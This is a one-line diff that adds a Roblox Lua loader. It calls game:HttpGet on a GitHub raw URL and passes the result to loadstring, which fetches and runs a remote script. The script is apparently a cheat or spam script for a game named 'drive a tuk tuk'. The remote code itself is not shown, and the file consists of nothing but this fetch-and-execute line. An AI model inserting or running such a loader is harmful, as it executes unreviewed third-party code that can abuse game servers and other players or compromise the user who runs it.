@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/drive-a-tuk-tuk-spam5-jzbl6icfhi0krp.lua"))()
